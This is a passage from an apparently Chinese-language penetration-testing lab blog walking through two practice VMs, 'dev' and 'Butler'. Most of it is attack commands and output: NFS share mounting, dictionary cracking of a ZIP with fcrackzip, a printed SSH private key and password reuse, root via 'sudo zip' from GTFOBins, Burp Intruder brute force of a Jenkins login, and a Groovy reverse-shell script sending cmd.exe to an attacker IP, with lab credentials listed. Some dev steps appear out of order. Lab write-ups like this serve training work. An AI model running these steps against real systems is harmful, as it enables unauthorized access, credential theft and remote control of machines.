Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">**jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash**</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin</span><br><span class="line">statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>看起來這邊只有一個用戶<strong>jeanpaul，嘗試用ssh登入</strong></p>
</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **ssh -i id_rsa jeanpaul@192.168.19.142** </span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">jeanpaul@192.168.19.142<span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>
<ul>
<li>這邊可以嘗試 brute forcing key id_rsa，如果是弱密碼就有機會爆破出</li>
<li>也可以嘗試之前找到的db資料 &gt; password: I_love_java 試試</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **ssh -i id_rsa jeanpaul@192.168.19.142**</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: **I_love_java** </span><br><span class="line">Linux dev 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31</span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">ls</span></span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/jeanpaul</span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">history</span> </span><br><span class="line">    1  <span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; .bash_history </span><br><span class="line">    2  <span class="built_in">sudo</span> -l</span><br><span class="line">    3  <span class="built_in">exit</span></span><br><span class="line">    4  <span class="built_in">ls</span></span><br><span class="line">    5  <span class="built_in">pwd</span></span><br><span class="line">    6  <span class="built_in">history</span></span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jeanpaul on dev:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jeanpaul may run the following commands on dev:</span><br><span class="line">    **(root) NOPASSWD: /usr/bin/zip**</span><br></pre></td></tr></table></figure>
<ul>
<li><p>用sudo zip去進行權限提升，在有限的root權限指令下進行提權</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
<li>進入網頁點選 sudo&gt;找到zip&gt;</li>
</ul>
<p>  <img src="/img/privilege_Untitled_22.png" alt="Untitled"></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**jeanpaul@dev:~$ TF=$(<span class="built_in">mktemp</span> -u)</span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">sudo</span> zip <span class="variable">$TF</span> /etc/hosts -T -TT <span class="string">&#x27;sh #&#x27;</span>**</span><br><span class="line">  adding: etc/hosts (deflated 31%)</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># sudo -l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> root on dev:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User root may run the following commands on dev:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line"><span class="comment"># cd /root      </span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">Congratz on rooting this box !</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>nfs &gt;</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://kalitut.com/mount-nfs-share/">https://kalitut.com/mount-nfs-share/</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting</a></li>
</ul>
</li>
<li><p>查詢目標機器上的NFS(Network File System)共享的輸出結果</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **showmount -e** 192.168.19.142</span><br><span class="line">Export list <span class="keyword">for</span> 192.168.19.142:</span><br><span class="line">/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16</span><br><span class="line"><span class="comment">#這台主機上的NFS共享目錄為/srv/nfs</span></span><br></pre></td></tr></table></figure>

<p>此共享目錄允許以下範圍的IP地址進行訪問：</p>
<ul>
<li>172.16.0.0&#x2F;12：表示172.16.0.0至172.31.255.255的IP範圍。</li>
<li>10.0.0.0&#x2F;8：表示10.0.0.0至10.255.255.255的IP範圍。</li>
<li>192.168.0.0&#x2F;16：表示192.168.0.0至192.168.255.255的IP範圍。</li>
</ul>
<p>換句話說，這個NFS共享只允許來自這些IP範圍的主機訪問。</p>
<p>成功將目標機器上&#x2F;srv&#x2F;nfs共享目錄掛載到了本地(攻擊者)系統上，並且可以在&#x2F;mnt&#x2F;dev目錄中訪問該共享目錄中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">mkdir</span> /mnt/dev</span><br><span class="line">                                                                                                                                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# mount -t nfs 192.168.19.142:/srv/nfs /mnt/dev</span><br><span class="line"><span class="comment">#從192.168.19.142主機掛載了一個NFS共享目錄到本地系統的/mnt/dev目錄</span></span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cd</span> /mnt/dev          </span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# <span class="built_in">ls</span>                </span><br><span class="line">save.zip</span><br><span class="line"><span class="comment">#進入了/mnt/dev目錄並列出了其中的文件，發現有一個名為save.zip的文件。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>找到文件後嘗試解壓縮發現需要密碼但目前沒有</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# unzip save.zip </span><br><span class="line">Archive:  save.zip</span><br><span class="line">[save.zip] id_rsa password: </span><br><span class="line">   skipping: id_rsa                  incorrect password</span><br><span class="line">   skipping: todo.txt                incorrect password</span><br></pre></td></tr></table></figure>

<ul>
<li>嘗試破解ZIP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# apt install fcrackzip       </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  fcrackzip</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip </span><br><span class="line">found file <span class="string">&#x27;id_rsa&#x27;</span>, (size <span class="built_in">cp</span>/uc   1435/  1876, flags 9, chk 2a0d)</span><br><span class="line">found file <span class="string">&#x27;todo.txt&#x27;</span>, (size <span class="built_in">cp</span>/uc    138/   164, flags 9, chk 2aa1)</span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == java101</span><br><span class="line"></span><br><span class="line"><span class="comment"># -v 詳細模式（Verbose mode）提供額外的細節</span></span><br><span class="line"><span class="comment"># -u 破解zip檔案</span></span><br><span class="line"><span class="comment"># -D using a dictionary attack</span></span><br><span class="line"><span class="comment"># -p using file in order to attack</span></span><br></pre></td></tr></table></figure>

<ul>
<li>找到密碼並解壓縮</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **unzip save.zip**                                                 </span><br><span class="line">Archive:  save.zip</span><br><span class="line">[save.zip] id_rsa password: </span><br><span class="line">  inflating: id_rsa                  </span><br><span class="line">  inflating: todo.txt                </span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **<span class="built_in">ls</span>**</span><br><span class="line">id_rsa  save.zip  todo.txt</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **<span class="built_in">cat</span> todo.txt** </span><br><span class="line">- Figure out how to install the main website properly, the config file seems correct...</span><br><span class="line">- Update development website</span><br><span class="line">- Keep coding <span class="keyword">in</span> Java because it<span class="string">&#x27;s awesome</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**jp**</span></span><br><span class="line"><span class="string">                                                                                                                                       </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/mnt/dev]</span></span><br><span class="line"><span class="string">└─# **cat id_rsa**  </span></span><br><span class="line"><span class="string">-----BEGIN OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea</span></span><br><span class="line"><span class="string">0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4</span></span><br><span class="line"><span class="string">0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj</span></span><br><span class="line"><span class="string">3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs+2nsT1Z/JONKNWMYEqQKSuhBLsMzhkUEEbw3WLq</span></span><br><span class="line"><span class="string">S0kiHCk/0VnPZ8EdMCsMGdj2MUm+ccr0GZySFg5SAJzJw2BGnjFSS+dERxb7e9tSLgDv4n</span></span><br><span class="line"><span class="string">Wg7fWw2dcG956mh1ZrPau7Gc1hFHQLLUHPgXx3Xp0f5/pGzkk6JACzCKIQj0Qo3ueb6JSC</span></span><br><span class="line"><span class="string">xWgwn6ey6XywTi9i7TdfFyCSiFW//jkeczyaQOxI/hyqYfLeiRB3AAAD0PHU/4RN8f2HUG</span></span><br><span class="line"><span class="string">ks1NM9+C9B+Fpn+nGjRj6/53m3HoBaUb/JZyvUvOXNoYnxNKIxHP5r4ytsd8X8xp5zTpi1</span></span><br><span class="line"><span class="string">tNmTeoB1kyoi2Uh70yPo4M6VlNupSeCzMQIYs/Wqya4ycyv1/yhGAPTZg8ARqop/RTQJtI</span></span><br><span class="line"><span class="string">EYVDbTxKxr7JGBfaBPiFWdUIKlN1yBXWMRrIs3SBoOaQ/n+CZKQ65mMFRs4VwqpUsRJ8y7</span></span><br><span class="line"><span class="string">ZoLZIfwaunV5f10PsCR8rp/2g563gK0bu+iVUqeo+kJMtFN7yEj2OaO6N/EdO4x/LVhqjY</span></span><br><span class="line"><span class="string">SPZD6w23mPp2I693oop1VpITsHV2talK1lLvS239gU45J4VlxFtcLjRlSAhc1ktnHw1e4u</span></span><br><span class="line"><span class="string">dRZ68JW0z2S4Y8q4EO/H4kGlZsyaf6oLCspGW1YQPhDJ2v6KkgRXyFb3tvo617yGEcBzzh</span></span><br><span class="line"><span class="string">wrVuEXObOc+zDOYgw1a/1x1pzK5vGQWaUOjN2FEz+vnSPTX3cbgUkLh3ZshuVzov0Rx7i+</span></span><br><span class="line"><span class="string">AM0CNiXVmgCGdLg0yBIv8lFIjYxswxTRkNzKYSagEZQNFCf+0H1cZcXKCK8z9a2NvBkQ/b</span></span><br><span class="line"><span class="string">rGvuoZuIjGqGvMP3Ifdma7PsG3A8GNOgWnl9YuMgc4r2WulsQVLVEJGIJjap71oNwGCUud</span></span><br><span class="line"><span class="string">T1Ou2tVn7Cf0T/NmuRmh7VUkTagDMf3u5X+UIST5Sv8y2y9jgR4x92ZL+AY968Pif1devc</span></span><br><span class="line"><span class="string">753z+GL7eWfbNqd+TJfxPdh82EqE5cmN/jYOKc0D1MC2zVChNCVWQYf4uVQ0L/XOXQXnFT</span></span><br><span class="line"><span class="string">hWdHfnf/SXos28dSM7Kx6B3jmeZQ60vk0Apas0D9gLz5xZ9GCb0Dwwka4dBSw57cwBbB3E</span></span><br><span class="line"><span class="string">PKXqJFks2ZnkyVL1W8u6ovnkpcqQz1mxr42zdC52Jc30NYww7H2G7v7FYKtf6tEyzeXG2+</span></span><br><span class="line"><span class="string">rcZwO4evWbV158rzrA4ibsGRn8+PM86LI/7T5/Y5pc2T+TAaDjKLRZ0Dtv5nMvHpigqDu4</span></span><br><span class="line"><span class="string">+e/eQk9dTmMPv9jbqcHeRo7N/Q8EC4vtXj/pCPydB5lYw/GMb8Bq5opXzADx0n4zDLtGDC</span></span><br><span class="line"><span class="string">LHcAIF6FMa+kLQHKvG1fDIK2xpLz+HxYCYTS/UAVRtWAdzQ29uG8zFAopGoQGbNA+caq7z</span></span><br><span class="line"><span class="string">iLUBEWHXJktNenIrfF3rqB3m8SNyNIn+MQS3LIakhlHAqXMIWU2pQE/0tF+V8xuKRpZvw/</span></span><br><span class="line"><span class="string">gdhLfAhm2gZMQzOe1cXWhKmtEQUntPdPAyfOTZcUtcs/pKNEjNTz5YnhQqnDbAh5x46UgZ</span></span><br><span class="line"><span class="string">q4xpWBvdz0v8qwF6LXLdPBEcT4TOg=</span></span><br><span class="line"><span class="string">-----END OPENSSH PRIVATE KEY-----</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>id_rsa  可以連線到SSH，利用這檔案連線到 <code>jp</code> 用戶，但目前還不知道密碼</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **ssh -i id_rsa jp@192.168.19.142**                                 </span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.19.142 (192.168.19.142)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes </span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.19.142<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">jp@192.168.19.142&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">jp@192.168.19.142<span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>

<h3 id="Walkthrough-Butler"><a href="#Walkthrough-Butler" class="headerlink" title="Walkthrough - Butler"></a><strong>Walkthrough - Butler</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Added fix <span class="keyword">for</span> NIC Power Management</span><br><span class="line"></span><br><span class="line">Added fix <span class="keyword">for</span> ServicesPipeTimeout</span><br><span class="line"> - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control</span><br><span class="line">   - New RegKey ServicesPipeTimeout</span><br><span class="line">   - New DWORD Value (32bit)</span><br><span class="line">     - Decimal 18000</span><br><span class="line"></span><br><span class="line">Disabled Windows Firewall </span><br><span class="line">Disabled Windows Defender AV </span><br><span class="line">Disabled Windows Update </span><br><span class="line">Removed any existing Windows Updates</span><br></pre></td></tr></table></figure>

<ul>
<li>Low Privilege User - butler:JeNkIn5@44</li>
<li>Admin - administrator:A%rc!BcA!</li>
<li>ip - 192.168.19.142</li>
</ul>
<p>查看到網頁8080port先去開網頁查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -T4 -A -p- 192.168.19.143</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 00:31 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.143</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">**135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5040/tcp  open  unknown</span><br><span class="line">7680/tcp  open  pando-pub?</span><br><span class="line">8080/tcp  open  http          Jetty 9.4.41.v20210516**</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Jetty(9.4.41.v20210516)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html;charset=utf-8).</span></span><br><span class="line"><span class="string">49664/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49665/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49666/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49667/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49668/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49670/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:26:C4:D4 (VMware)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Microsoft Windows 10</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:microsoft:windows_10</span></span><br><span class="line"><span class="string">OS details: Microsoft Windows 10 1709 - 1909</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_nbstat: NetBIOS name: BUTLER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:26:c4:d4 (VMware)</span></span><br><span class="line"><span class="string">|_clock-skew: 15h59m58s</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2024-02-17T21:34:18</span></span><br><span class="line"><span class="string">|_  start_date: N/A</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   3:1:1: </span></span><br><span class="line"><span class="string">|_    Message signing enabled but not required</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   0.95 ms 192.168.19.143</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 198.01 seconds</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看網頁open source也沒有發現特別可以利用的東西</li>
</ul>
<p><img src="/img/privilege_Untitled_23.png" alt="Untitled"></p>
<ul>
<li>查找Jenkins漏洞</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security">https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/gquere/pwn_jenkins">https://github.com/gquere/pwn_jenkins</a></p>
<ul>
<li><p>查看jenkins default passwd</p>
<ul>
<li>admin&#x2F;password</li>
<li>嘗試用它做利用</li>
</ul>
<p>  <img src="/img/privilege_Untitled_24.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_25.png" alt="Untitled">
  </p>
</li>
<li><p>嘗試7680 port的開啟，不確定這port用途可以開goole查看或網頁開啟試試</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **apt install telnet**</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">telnet is already the newest version (0.17+2.5-3).</span><br><span class="line">telnet <span class="built_in">set</span> to manually installed.</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 123 not upgraded.</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# telnet 192.168.19.143 7680</span><br><span class="line">Trying 192.168.19.143...</span><br><span class="line">telnet: Unable to connect to remote host: Connection refused</span><br></pre></td></tr></table></figure>

<p><img src="/img/privilege_Untitled_26.png" alt="Untitled"></p>
<ul>
<li>brute force Jenkins</li>
</ul>
<p>通過foxyproxy攔截封包 &gt; Intruder &amp; Repeater</p>
<p><img src="/img/privilege_Untitled_27.png" alt="Untitled"></p>
<ul>
<li>Intruder 當有兩參數時，可以選擇要Pitchfork還是Cluster bomb</li>
<li>兩者差異主要是<ul>
<li>Pitchfork &gt; 1 to 1<ul>
<li>帳號 vs 密碼，順序比對</li>
</ul>
</li>
<li>Cluster bomb &gt; 1 to all<ul>
<li>一帳號 vs 全密碼依序比對</li>
</ul>
</li>
</ul>
</li>
<li>這邊選擇Cluster bomb，因為我們不確定admin跟passwd的任何一方</li>
</ul>
<p><img src="/img/privilege_Untitled_28.png" alt="Untitled"></p>
<p>輸入極有可能會出現的帳號及密碼</p>
<p><img src="/img/privilege_Untitled_29.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_30.png" alt="Untitled"></p>
<p>通過查看爆破後的長度，會發現有一個特別不一樣，嘗試登入</p>
<ul>
<li>通過比對長度不同的網頁回應會看到兩者有些許差異</li>
</ul>
<p><img src="/img/privilege_Untitled_31.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_32.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_33.png" alt="Untitled"></p>
<p>成功登入後看到Jenkins版本 &gt; 2.289.3，這對滲透測試來說是不錯的訊息</p>
<p><img src="/img/privilege_Untitled_34.png" alt="Untitled"></p>
<p>也通過hacktricks告訴我們的資訊，嘗試利用</p>
<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security">https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security</a></p>
<p>察看到這邊有很多功能</p>
<ul>
<li>注意到CLI，也許可以用它運行shell</li>
<li>script console &gt; Groovy script，前面在做資訊蒐集時有看到Groovy似乎是能拿來利用</li>
</ul>
<p><img src="/img/privilege_Untitled_35.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_36.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_37.png" alt="Untitled"></p>
<p>查詢google &gt; Groovy script exploit </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a></li>
<li><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script">https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6">https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6</a></li>
<li><a target="_blank" rel="noopener" href="https://coldfusionx.github.io/posts/Groovy_RCE/">https://coldfusionx.github.io/posts/Groovy_RCE&#x2F;</a></li>
</ul>
<p>可以通過一些Reverse shell利用，貼到script console中，並開啟nc監聽，再console中運行下列指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String host=<span class="string">&quot;localhost&quot;</span>; <span class="comment">#換成attacker IP</span></span><br><span class="line">int port=8044;</span><br><span class="line">String cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(<span class="literal">true</span>).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;0)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;0)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.<span class="built_in">sleep</span>(50);try &#123;p.exitValue();<span class="built_in">break</span>;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>

<p><img src="/img/privilege_Untitled_38.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 8044**                 </span><br><span class="line">listening on [any] 8044 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.143] 49724</span><br><span class="line">Microsoft Windows [Version 10.0.19043.928]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Program Files\Jenkins&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">butler\butler</span><br></pre></td></tr></table></figure>

<ul>
<li>我們不是最高權限用戶，嘗試提權</li>
</ul>
<p>查看該機器資訊 <code>systeminfo</code> 版本資訊可以尋找該版本是否有利用點</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Jenkins&gt;**systeminfo**</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 BUTLER</span><br><span class="line">OS Name:                   Microsoft Windows 10 Enterprise Evaluation</span><br><span class="line">**OS Version:                10.0.19043 N/A Build 19043**</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          butler</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00329-20000-00001-AA079</span><br><span class="line">Original Install Date:     8/14/2021, 3:51:38 AM</span><br><span class="line">System Boot Time:          2/16/2024, 10:49:03 PM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 96 Stepping 1 AuthenticAMD ~2895 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 96 Stepping 1 AuthenticAMD ~2895 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.16722896.B64.2008100651, 8/10/2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 1,545 MB</span><br><span class="line">Virtual Memory: Max Size:  3,199 MB</span><br><span class="line">Virtual Memory: Available: 2,260 MB</span><br><span class="line">Virtual Memory: In Use:    939 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    WORKGROUP</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 4 Hotfix(s) 